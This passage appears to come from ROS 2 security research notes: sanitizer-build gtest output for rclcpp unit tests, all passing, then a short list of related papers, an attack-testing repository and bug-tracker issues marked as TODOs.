    <span id="cb150-576"><a href="#cb150-576" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.operators</span></span>
    <span id="cb150-577"><a href="#cb150-577" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.operators</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-578"><a href="#cb150-578" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.chrono_overloads</span></span>
    <span id="cb150-579"><a href="#cb150-579" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.chrono_overloads</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-580"><a href="#cb150-580" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.overflows</span></span>
    <span id="cb150-581"><a href="#cb150-581" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.overflows</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-582"><a href="#cb150-582" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.negative_duration</span></span>
    <span id="cb150-583"><a href="#cb150-583" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.negative_duration</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-584"><a href="#cb150-584" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.maximum_duration</span></span>
    <span id="cb150-585"><a href="#cb150-585" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.maximum_duration</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-586"><a href="#cb150-586" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.from_seconds</span></span>
    <span id="cb150-587"><a href="#cb150-587" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.from_seconds</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-588"><a href="#cb150-588" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestDuration.std_chrono_constructors</span></span>
    <span id="cb150-589"><a href="#cb150-589" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestDuration.std_chrono_constructors</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-590"><a href="#cb150-590" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestDuration <span class="er">(</span><span class="ex">1</span> ms total<span class="kw">)</span></span>
    <span id="cb150-591"><a href="#cb150-591" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-592"><a href="#cb150-592" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-593"><a href="#cb150-593" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 7 tests from 1 test case ran. <span class="er">(</span><span class="ex">2</span> ms total<span class="kw">)</span></span>
    <span id="cb150-594"><a href="#cb150-594" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">7</span> tests.</span>
    <span id="cb150-595"><a href="#cb150-595" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-596"><a href="#cb150-596" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 4 tests from 1 test case.</span>
    <span id="cb150-597"><a href="#cb150-597" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-598"><a href="#cb150-598" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestParameterClient</span>
    <span id="cb150-599"><a href="#cb150-599" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterClient.async_construction_and_destruction</span></span>
    <span id="cb150-600"><a href="#cb150-600" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterClient.async_construction_and_destruction</span> <span class="er">(</span><span class="ex">117</span> ms<span class="kw">)</span></span>
    <span id="cb150-601"><a href="#cb150-601" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterClient.sync_construction_and_destruction</span></span>
    <span id="cb150-602"><a href="#cb150-602" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterClient.sync_construction_and_destruction</span> <span class="er">(</span><span class="ex">96</span> ms<span class="kw">)</span></span>
    <span id="cb150-603"><a href="#cb150-603" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterClient.async_parameter_event_subscription</span></span>
    <span id="cb150-604"><a href="#cb150-604" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterClient.async_parameter_event_subscription</span> <span class="er">(</span><span class="ex">61</span> ms<span class="kw">)</span></span>
    <span id="cb150-605"><a href="#cb150-605" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameterClient.sync_parameter_event_subscription</span></span>
    <span id="cb150-606"><a href="#cb150-606" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameterClient.sync_parameter_event_subscription</span> <span class="er">(</span><span class="ex">58</span> ms<span class="kw">)</span></span>
    <span id="cb150-607"><a href="#cb150-607" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 4 tests from TestParameterClient <span class="er">(</span><span class="ex">333</span> ms total<span class="kw">)</span></span>
    <span id="cb150-608"><a href="#cb150-608" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-609"><a href="#cb150-609" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-610"><a href="#cb150-610" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 4 tests from 1 test case ran. <span class="er">(</span><span class="ex">355</span> ms total<span class="kw">)</span></span>
    <span id="cb150-611"><a href="#cb150-611" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">4</span> tests.</span>
    <span id="cb150-612"><a href="#cb150-612" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> gmock_main.cc</span>
    <span id="cb150-613"><a href="#cb150-613" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 7 tests from 1 test case.</span>
    <span id="cb150-614"><a href="#cb150-614" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-615"><a href="#cb150-615" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestLoggingMacros</span>
    <span id="cb150-616"><a href="#cb150-616" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_named</span></span>
    <span id="cb150-617"><a href="#cb150-617" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_named</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-618"><a href="#cb150-618" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_string</span></span>
    <span id="cb150-619"><a href="#cb150-619" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_string</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-620"><a href="#cb150-620" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_once</span></span>
    <span id="cb150-621"><a href="#cb150-621" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_once</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-622"><a href="#cb150-622" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_expression</span></span>
    <span id="cb150-623"><a href="#cb150-623" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_expression</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-624"><a href="#cb150-624" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_function</span></span>
    <span id="cb150-625"><a href="#cb150-625" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_function</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-626"><a href="#cb150-626" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_skipfirst</span></span>
    <span id="cb150-627"><a href="#cb150-627" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_logging_skipfirst</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-628"><a href="#cb150-628" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_log_from_node</span></span>
    <span id="cb150-629"><a href="#cb150-629" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLoggingMacros.test_log_from_node</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-630"><a href="#cb150-630" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestLoggingMacros <span class="er">(</span><span class="ex">2</span> ms total<span class="kw">)</span></span>
    <span id="cb150-631"><a href="#cb150-631" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-632"><a href="#cb150-632" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-633"><a href="#cb150-633" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 7 tests from 1 test case ran. <span class="er">(</span><span class="ex">3</span> ms total<span class="kw">)</span></span>
    <span id="cb150-634"><a href="#cb150-634" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">7</span> tests.</span>
    <span id="cb150-635"><a href="#cb150-635" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-636"><a href="#cb150-636" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-637"><a href="#cb150-637" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-638"><a href="#cb150-638" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestLogger</span>
    <span id="cb150-639"><a href="#cb150-639" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLogger.factory_functions</span></span>
    <span id="cb150-640"><a href="#cb150-640" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLogger.factory_functions</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-641"><a href="#cb150-641" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestLogger.hierarchy</span></span>
    <span id="cb150-642"><a href="#cb150-642" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestLogger.hierarchy</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-643"><a href="#cb150-643" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestLogger <span class="er">(</span><span class="ex">1</span> ms total<span class="kw">)</span></span>
    <span id="cb150-644"><a href="#cb150-644" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-645"><a href="#cb150-645" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-646"><a href="#cb150-646" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">1</span> ms total<span class="kw">)</span></span>
    <span id="cb150-647"><a href="#cb150-647" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-648"><a href="#cb150-648" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-649"><a href="#cb150-649" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-650"><a href="#cb150-650" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-651"><a href="#cb150-651" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestExpandTopicOrServiceName</span>
    <span id="cb150-652"><a href="#cb150-652" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExpandTopicOrServiceName.normal</span></span>
    <span id="cb150-653"><a href="#cb150-653" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExpandTopicOrServiceName.normal</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-654"><a href="#cb150-654" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestExpandTopicOrServiceName.exceptions</span></span>
    <span id="cb150-655"><a href="#cb150-655" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestExpandTopicOrServiceName.exceptions</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-656"><a href="#cb150-656" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestExpandTopicOrServiceName <span class="er">(</span><span class="ex">2</span> ms total<span class="kw">)</span></span>
    <span id="cb150-657"><a href="#cb150-657" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-658"><a href="#cb150-658" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-659"><a href="#cb150-659" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">3</span> ms total<span class="kw">)</span></span>
    <span id="cb150-660"><a href="#cb150-660" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-661"><a href="#cb150-661" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-662"><a href="#cb150-662" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 1 test from 1 test case.</span>
    <span id="cb150-663"><a href="#cb150-663" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-664"><a href="#cb150-664" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestInit</span>
    <span id="cb150-665"><a href="#cb150-665" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestInit.is_initialized</span></span>
    <span id="cb150-666"><a href="#cb150-666" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestInit.is_initialized</span> <span class="er">(</span><span class="ex">29</span> ms<span class="kw">)</span></span>
    <span id="cb150-667"><a href="#cb150-667" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestInit <span class="er">(</span><span class="ex">29</span> ms total<span class="kw">)</span></span>
    <span id="cb150-668"><a href="#cb150-668" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-669"><a href="#cb150-669" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-670"><a href="#cb150-670" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 1 test from 1 test case ran. <span class="er">(</span><span class="ex">30</span> ms total<span class="kw">)</span></span>
    <span id="cb150-671"><a href="#cb150-671" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">1</span> test.</span>
    <span id="cb150-672"><a href="#cb150-672" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-673"><a href="#cb150-673" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 7 tests from 1 test case.</span>
    <span id="cb150-674"><a href="#cb150-674" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-675"><a href="#cb150-675" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestGetNodeInterfaces</span>
    <span id="cb150-676"><a href="#cb150-676" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.rclcpp_node_shared_ptr</span></span>
    <span id="cb150-677"><a href="#cb150-677" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.rclcpp_node_shared_ptr</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-678"><a href="#cb150-678" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.node_shared_ptr</span></span>
    <span id="cb150-679"><a href="#cb150-679" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.node_shared_ptr</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-680"><a href="#cb150-680" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.rclcpp_node_reference</span></span>
    <span id="cb150-681"><a href="#cb150-681" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.rclcpp_node_reference</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-682"><a href="#cb150-682" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.node_reference</span></span>
    <span id="cb150-683"><a href="#cb150-683" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.node_reference</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-684"><a href="#cb150-684" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.rclcpp_node_pointer</span></span>
    <span id="cb150-685"><a href="#cb150-685" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.rclcpp_node_pointer</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-686"><a href="#cb150-686" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.node_pointer</span></span>
    <span id="cb150-687"><a href="#cb150-687" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.node_pointer</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-688"><a href="#cb150-688" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.interface_shared_pointer</span></span>
    <span id="cb150-689"><a href="#cb150-689" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestGetNodeInterfaces.interface_shared_pointer</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-690"><a href="#cb150-690" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestGetNodeInterfaces <span class="er">(</span><span class="ex">2</span> ms total<span class="kw">)</span></span>
    <span id="cb150-691"><a href="#cb150-691" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-692"><a href="#cb150-692" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-693"><a href="#cb150-693" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 7 tests from 1 test case ran. <span class="er">(</span><span class="ex">155</span> ms total<span class="kw">)</span></span>
    <span id="cb150-694"><a href="#cb150-694" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">7</span> tests.</span>
    <span id="cb150-695"><a href="#cb150-695" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-696"><a href="#cb150-696" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 8 tests from 1 test case.</span>
    <span id="cb150-697"><a href="#cb150-697" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-698"><a href="#cb150-698" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 8 tests from TestMappedRingBuffer</span>
    <span id="cb150-699"><a href="#cb150-699" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.empty</span></span>
    <span id="cb150-700"><a href="#cb150-700" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.empty</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-701"><a href="#cb150-701" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.temporary_l_value_with_shared_get_pop</span></span>
    <span id="cb150-702"><a href="#cb150-702" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.temporary_l_value_with_shared_get_pop</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-703"><a href="#cb150-703" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.temporary_l_value_with_unique_get_pop</span></span>
    <span id="cb150-704"><a href="#cb150-704" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.temporary_l_value_with_unique_get_pop</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-705"><a href="#cb150-705" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_shared_get_pop_shared</span></span>
    <span id="cb150-706"><a href="#cb150-706" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_shared_get_pop_shared</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-707"><a href="#cb150-707" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_shared_get_pop_unique</span></span>
    <span id="cb150-708"><a href="#cb150-708" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_shared_get_pop_unique</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-709"><a href="#cb150-709" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_unique_get_pop_unique</span></span>
    <span id="cb150-710"><a href="#cb150-710" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_unique_get_pop_unique</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-711"><a href="#cb150-711" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_unique_get_pop_shared</span></span>
    <span id="cb150-712"><a href="#cb150-712" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.nominal_push_unique_get_pop_shared</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-713"><a href="#cb150-713" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.non_unique_keys</span></span>
    <span id="cb150-714"><a href="#cb150-714" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMappedRingBuffer.non_unique_keys</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-715"><a href="#cb150-715" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 8 tests from TestMappedRingBuffer <span class="er">(</span><span class="ex">4</span> ms total<span class="kw">)</span></span>
    <span id="cb150-716"><a href="#cb150-716" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-717"><a href="#cb150-717" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-718"><a href="#cb150-718" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 8 tests from 1 test case ran. <span class="er">(</span><span class="ex">5</span> ms total<span class="kw">)</span></span>
    <span id="cb150-719"><a href="#cb150-719" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">8</span> tests.</span></code></pre></div>
    <p>Couldn’t find a way to reproduce it.</p>
    <h4 id="network-reconnaissance-and-vulnerabilityexcavation-of-secure-dds-systems">Network Reconnaissance and VulnerabilityExcavation of Secure DDS Systems</h4>
    <p>https://arxiv.org/pdf/1908.05310.pdf</p>
    <h4 id="ros2-sectest-httpsgithub.comaws-roboticsros2-sectest">ROS2-SecTest https://github.com/aws-robotics/ROS2-SecTest</h4>
    <p>https://github.com/aws-robotics/ROS2-SecTest/tree/master/include/ros_sec_test/attacks</p>
    <h4 id="rclcpp-ubsan-runtime-error-publisher_options-httpsgithub.comaliasroboticsrvdissues445">rclcpp, UBSAN: runtime error publisher_options https://github.com/aliasrobotics/RVD/issues/445</h4>
    <p>This might require to add support for ubsan in the tests. Accounting for the amount of time that this would require is hard beforehand.</p>
    <h4 id="security-and-performance-considerations-in-ros-2-a-balancing-act">Security and Performance Considerations in ROS 2: A Balancing Act</h4>
    <p>Potentially connected with Real-Time impact TODO: read, explore</p>
    <h4 id="exception-sending-message-over-network-httpsgithub.comros2rmw_fastrtpsissues317">Exception sending message over network https://github.com/ros2/rmw_fastrtps/issues/317</h4>
    <p>TODO: go through it and validate it.</p>
    <h2 id="resources-7">Resources</h2>
